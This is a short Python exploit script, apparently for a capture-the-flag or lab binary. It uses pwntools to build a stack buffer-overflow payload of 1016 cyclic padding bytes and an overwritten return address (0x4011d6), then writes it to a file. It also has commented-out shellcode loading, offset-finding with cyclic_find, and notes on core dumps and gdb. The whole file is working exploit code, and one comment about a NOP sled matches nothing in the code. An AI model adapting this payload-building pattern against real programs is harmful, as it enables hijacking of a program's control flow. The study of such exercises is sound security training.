#!/usr/bin/env python3
from pwn import *

if __name__ == '__main__':
    # Read in the shellcode
    # with open("shellcode.shell", "rb") as file:
    #     shellcode = file.read()

    # Pad the rest of the payload with cyclic bytes until we get to the overflow
    payload = cyclic(1016)
    payload += p64(0x4011d6) #target address
    # payload += shellcode

    # Return to the middle of our NOP sled.

    with open("payload", "wb") as file:
        file.write(payload)


print(cyclic_find('eaak'))
print(payload) 

# Core file setup
# ulimit -c unlimited
# cat /proc/sys/kernel/core_pattern

# gdb -c <corefile>